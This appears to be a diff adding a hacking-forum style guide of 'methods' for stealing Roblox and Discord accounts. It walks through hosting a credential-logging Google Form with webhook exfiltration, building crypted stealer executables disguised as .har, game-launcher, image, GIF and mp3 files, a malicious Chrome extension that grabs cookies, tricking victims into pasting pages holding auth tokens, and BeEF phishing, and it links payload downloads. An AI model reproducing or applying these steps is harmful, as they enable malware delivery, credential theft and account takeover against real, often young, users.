@@ -1,0 +1,201 @@
+
+Google Form Method | OP?
+Full guide on Google Form method:
+
+Go on your browser and go to https://www.000webhost.com/
+
+Click the red "Get started" button and then click "Free sign up" on the free trial.
+
+Now create your account, I prefer just using login with Google (if you did not use login with Google, you have to verify your email before continuing)
+
+Once you are on another page with options, select the "Other" options and then press "Skip" in the corner if you are not using Google Chrome, put in your custom website name, and then press submit.
+
+Now, select "Upload your site"
+
+First of all, delete the "public_html" folder by clicking on it and then press the Trash Can on the top bar.
+
+Next, insert a folder with a new folder option. Name the newly created folder "public_php"
+
+Open the new folder you have made, click on it and then press the Open button on the top bar once again.
+
+Now, here comes the fun part. Download all of these provided files below.
+
+https://cdn.discordapp.com/attachments/838832183279484968/838832241722523718/form.php
+https://cdn.discordapp.com/attachments/838832183279484968/838832241798938664/payload.js
+https://cdn.discordapp.com/attachments/838832183279484968/838832243895173200/send.php
+https://cdn.discordapp.com/attachments/838832183279484968/838832245389000764/status.php
+https://cdn.discordapp.com/attachments/838832183279484968/838832247343415336/config.php
+
+Or https://mega.nz/file/RfxWiZII#WNFf0IWc07aMU9fZRZrOowVQtAvGPdxQX3HJjnKYp8E
+
+Remove the "$googleformwebpage" it's dual hook on status.php
+
+Done? Press the Upload Files button (you know where it is), press select files and then select all of the downloaded files, after that press Upload and then wait until it is done.
+
+Open the file named "send.php" and then press Ctrl + F. Type "yourwebhook" in the box and then press enter. Now, this is the tricky part. Put your prepared webhook and then put it in the highlighted part.
+https://media.discordapp.net/attachments/885878358704009277/886668035438567434/wb7Yk3as.png
+OK, nice. After that press "Save & Close"
+
+Next step! Go to https://docs.google.com/forms/u/0/ and then click new form. After creating a new form, you can customize it however you want, go crazy. Now, press the preview (eye icon) button at the top right corner.
+
+After that press Ctrl + U on the page, press Ctrl + F on the new page that you got redirected to, and look for "form action=" It should look something like this form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSc4NPbI6X_Nc8yS89t86hLNjwQbk_JzfI3fFPbGHBL8whOmsg/formResponse
+
+Found it? Copy the URL and then paste it onto a notepad or somewhere.
+
+After that go back to the preview page and then press Ctrl + Shift + I. What you are looking for this time is entry.(numbers) It should look something like this <input type="hidden" name="entry.895940829" value=""> Ok, this time, copy the entry.895940829 of yours and then paste it in the name notepad as the previous URL.
+
+Now the full address will be constructed as follows:
+[actionURL]?[entry]=
+
+In my case the full URL looked like this:
+
+https://docs.google.com/forms/d/e/1FAIp_____CFPoQg/formResponse?entry.1928374650=
+
+Now that you have got that, open "form.php" and then paste the link you constructed on the part that is yoururlhere, Press "Save & Close"
+
+And that's it, you have set up the method!
+
+
+﻿Exe to Com
+--------------------------------------------
+https://file-link.net/355422/exe2com
+--------------------------------------------
+1. Follow the instructions
+
+
+Reverse Har Method
+Downloads:
+Mega.nz(https://mega.nz/file/545RFKoT#OzEUpgjnsUfJ4j2-2r6rL-vxmwklj3FXzYuWnseVkKQ)
+NYAN-x-CAT(https://github.com/NYAN-x-CAT/Lime-Crypter/releases/tag/v0.5)
+Notepad Icon(https://cdn.discordapp.com/attachments/835379200097517588/838054920845393930/Notepad.ico)
+
+1.) Download all the files above The files are required to use reverse-har-method
+
+2.) Put your webhook and customize what you want the stub to do to the PC and click Press Stealer after dragging your EXE to C:\Users\Public\Music and put it inside of that folder.
+This makes it untraceable
+
+3.) Now launch Lime-Crypter as an administrator and set your payload path to C:\Users\Public\Music\stubname.exe and then click the ICON button and select the Notepad.ICO file that you downloaded after clicking the Build button!
+
+4.) You've created your stub locate the path to it and rename it to www.roblox.com.har__.exe and upload it to <https://file.io/ >
+
+5.) For this method to work tell them you can't send the .HAR because you don't have nitro so instead you will upload it to https://file.io/
+
+
+1.) Find someone on Roblox or Discord and convince them to join your game to test the latest update when they join tell them they don't have the latest version of Roblox
+
+2.) Tell them to uninstall their current version of Roblox and install Roblox again after they do
+https://cdn.discordapp.com/attachments/845259343275491338/846453177989464094/unknown.png
+
+3.) They need to click Download and Install Roblox after they need to save the RobloxPlayerLauncher to their pc once they do that
+https://cdn.discordapp.com/attachments/845259343275491338/846453419145297942/unknown.png
+
+4.) They'll see an arrow once they click that they need to click Always open files of this type
+https://cdn.discordapp.com/attachments/845259343275491338/846453634862022676/unknown.png
+
+5.) Now create a new Stub and rename it to RobloxPlayerLauncher.exe send them your stub when they download it it will automatically open without checking for a virus inside of the executable
+
+
+Extension Logger
+1. Download this zip https://www.mediafire.com/file/7mqwevmo23uwi9f/Extension_Logger_V2.zip/file.
+2. Extract the folder inside.
+3. Right-click and press edit in BGWork.js
+4. Put in your webhook where it says "YOUR WEBHOOK."
+5. Copy everything and go to obfuscate it ( obfuscate under).
+6. Now, your victim has to download the folder you made. (Archive it to zip and send them that.)
+7. Tell them to extract the folder.
+8. make them go to manage extensions (chrome://extensions/).
+9. Make them press on dev mode top right.
+10. Make them press Load unpacked (top left).
+11. Make them select the folder they extracted.
+12. Make them press "ok."
+13. Boom, you have their cookie.
+14. The Last step spam our invite link in their DMS
+OBFUSCATE :
+Free simple obfuscator, https://javascriptobfuscator.com/Javascript-Obfuscator.aspx.
+Free simple decrypter, http://jsnice.org/.
+
+
+Image Logger
+Image Method -
+1). Get a stub builder
+2). Attach your webhook from your discord server to the logger,
+
+3). Now, Create your stub.
+
+4). Once you have your stub, you want to get any random image off the internet And make it jpg. I recommend art or gfx.
+
+5). You need WinRAR, and a brain Highlight both files <Right Click> And hit Add to Archive,
+
+6). Now rename the Archive name <Image name.jpg> then Click on <Create SFX Archive>
+
+7). <Advanced> SFX Options, For the path you want to make the path <C:\Users\Public\Music> So it's unfindable
+
+8). Go to Setup you want the image to run first and then the logger so <Dominus.jpg> And then Under it put the exe file <MBSTF.exe>
+
+9). Make A Icon for it using ico or just png, Go <Modes> <Hide All>
+
+10). Last step <update> Extract And Replace Files - Overwrite all files.
+
+hit ok And Exit out by hitting ok
+
+100th step don't fucking leak it pussy
+
+https://png2jpg.com/
+
+Png to jpg, for rar.
+
+Ico converter for the image icon
+
+
+GIF Logger Method
+
+Watch this video:  https://youtu.be/zN_A2N-kA0Y 
+
+This will show you low to hide the payload in a gif.
+
+Find an image on google.
+
+Create a stub
+
+Put both of the your gif and stub and create a sfx archive Instead of running a .png file in the run after extraction run your .gif
+
+
+mp3 Logger
+--MP3 METHOD --
+
+Downloads: https://cdn.discordapp.com/attachments/834973172146110544/841703949920501781/MusicIcon.ico
+
+
+1.) Create a stub using Depression (;stub) remove the "Patch.exe" from the zip. It's a trojan
+
+2.) Now disguise your icon as the mp3 icon
+
+3.) Rename your stub to
+AudioName.mp3 .exe
+and upload it to https://mega.nz/ copy your download link and send it to your target.
+
+
+4.) Now send it to your target and ask them to listen to your audio
+https://cdn.discordapp.com/attachments/840243491082469396/841704062302289980/unknown.png
+
+
+HTML method:
+
+This is like the studio method but not as known. There's a 50/50 percent of people falling for this. (actually kind of complicated, lol.)
+
+Anyway, let me explain. Tell them to open any game on ROBLOX and make sure they have this pop-up: https://cdn.discordapp.com/attachments/708019811384557599/761013633610022912/unknown.png / Idk if it works without the pop up because I never tried it yet. (probably works, though)
+
+Once they open it, redirect them to "Elements" and tell them to copy the blue HTML, which looks like this: "<html> / <html data-btr-loaded" on top of the actual element page. Tell them to paste it into your chat DMS. Open the "message.txt" they sent you. Their auth key is in there before doing anything—Press "Format" and press Word Wrap. Once done, press CTRL+F and search for "+gameinfo," that's their auth key. IF you don't know how to log in to someone's account with their auth key, please read up the studio method. I explained how to log in to people's accounts with it properly.
+
+Gmail AKA BeEf Xss
+Gmail XSS. Things you will need A VM with Kali Linux, BeEF.
+
+1) Once you have your virtual machine with Kali Linux on it, install BeEF. It's a pain to install but it's worth it. When customizing the site, but redirect to whatever site you want to get the cookies from.
+
+2) Now for the easy part, get the victim to click the link you created or spoofed with BeEF.
+
+3) After they have done that, wait a few seconds on your virtual machine, then click on "commands".
+
+4) Search for "google phishing"
+
+5) On the right the information will show up; log in to that, and change the Roblox email and password.
